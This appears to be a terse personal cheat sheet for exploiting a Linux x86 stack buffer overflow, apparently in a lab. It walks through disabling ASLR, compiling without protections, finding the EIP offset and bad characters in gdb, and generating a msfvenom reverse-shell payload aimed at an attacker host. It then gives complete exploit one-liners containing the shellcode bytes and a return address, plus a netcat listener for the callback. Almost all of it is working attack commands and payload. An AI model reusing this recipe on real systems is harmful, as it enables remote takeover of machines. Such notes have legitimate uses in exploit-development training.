
echo 0 > /proc/sys/kernel/randomize_va_space # execute as root

gcc bow.c -o bow32 -fno-stack-protector -z execstack -m32 # compile in 32 bit
gcc bow.c -o bow64 -fno-stack-protector -z execstack -m64 # Compile in 64 bit

gdb -q file_name # Open file using gdb to try Buffer Overflow
run $(python -c "print '\x55' * 1100") # Overwrite EIP to create Segmentation fault
run $(python -c "print 'pattern_value') # eg:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8 file: buffer_fuzz.py
Find buffer value with the offset eip result in Segmentation fault eg: 0x6a42346a -> 1063
info registers # View the address after overwriting the ESP & EIP
disassemble main # View the main function to create break point
break func_name # replace func_name with the actual function name present in main
info proc all # View the stack size and other details

Buffer = 1063 - 255 = 808
charset = '\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' = 255 # to find Bad chars
EIP = '\x66' * 4
run $(python -c "print '\x55' * Buffer + charset + EIP")
x/2000xb $esp+500 # Hex result with address of inserted value and bad char

Buffer = '\x55' * (1063 - 100 - 95) = 864
NOP = '\x90' * 100 # No Operation Instruction
msfvenom -p linux/x86/shell_reverse_tcp lhost=10.10.29.15 lport=4444 --platform linux --arch x86  --format c --bad-chars "\x00\x09\x0a\x20" --out shellcode # 95 bytes \x00 - always bad char
shellcode - 95 bytes # size of shell code generated in msfvenom
EIP = '\x66' * 4
run $(python -c "print Buffer + NOP + shellcode + EIP")
run $(python -c "print '\x55' * 864 + '\x90' * 100 + '\xbd\xce\xa5\x31\x48\xdb\xdf\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x12\x31\x6e\x12\x83\xee\xfc\x03\xa0\xab\xd3\xbd\x0d\x6f\xe4\xdd\x3e\xcc\x58\x48\xc2\x5b\xbf\x3c\xa4\x96\xc0\xae\x71\x99\xfe\x1d\x01\x90\x79\x67\x69\x29\x70\x8a\x66\x45\x86\xb4\x69\xc9\x0f\x55\x39\x97\x5f\xc7\x6a\xeb\x63\x6e\x6d\xc6\xe4\x22\x05\xb7\xcb\xb1\xbd\x2f\x3b\x19\x5f\xd9\xca\x86\xcd\x4a\x44\xa9\x41\x67\x9b\xaa' + '\x66' * 4)

Buffer = '\x55' * (1063 - 100 - 95) = 864
NOP = '\x90' * 100
shellcode - 95 bytes # size of shell code generated in msfvenom
x/2000xb $esp+500 # Find address of the shell code starting
EIP = '\x08\xd3\xff\xff' # value of 2 address before that execute the shell code - "x/2000xb $esp+500" (eg: 0xffffd308 -> \x08\xd3\xff\xff)
run $(python -c "print Buffer + NOP + shellcode + EIP")
run $(python -c "print '\x55' * 864 + '\x90' * 100 + '\xbd\xce\xa5\x31\x48\xdb\xdf\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x12\x31\x6e\x12\x83\xee\xfc\x03\xa0\xab\xd3\xbd\x0d\x6f\xe4\xdd\x3e\xcc\x58\x48\xc2\x5b\xbf\x3c\xa4\x96\xc0\xae\x71\x99\xfe\x1d\x01\x90\x79\x67\x69\x29\x70\x8a\x66\x45\x86\xb4\x69\xc9\x0f\x55\x39\x97\x5f\xc7\x6a\xeb\x63\x6e\x6d\xc6\xe4\x22\x05\xb7\xcb\xb1\xbd\x2f\x3b\x19\x5f\xd9\xca\x86\xcd\x4a\x44\xa9\x41\x67\x9b\xaa' + '\x08\xd3\xff\xff')

nc -lvnp 4444 # listener for reverse shell